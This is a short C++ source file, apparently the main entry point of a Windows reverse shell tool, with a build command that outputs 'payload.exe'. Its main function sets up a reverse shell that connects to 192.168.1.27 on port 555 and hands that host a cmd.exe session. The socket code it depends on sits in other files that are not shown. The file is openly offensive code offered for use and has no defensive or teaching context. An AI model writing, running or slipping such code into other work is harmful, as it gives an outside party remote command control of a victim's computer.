#include "reverse_shell.h"
// compile : g++ socket_winbd.cpp reverse_shell.cpp try_rev_shell.cpp -o payload.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

int main()
{
	ReverseShell rev_shell("192.168.1.27",555,AF_INET,"cmd.exe");
	rev_shell.get_config();
	rev_shell.exec();
	return 0;
}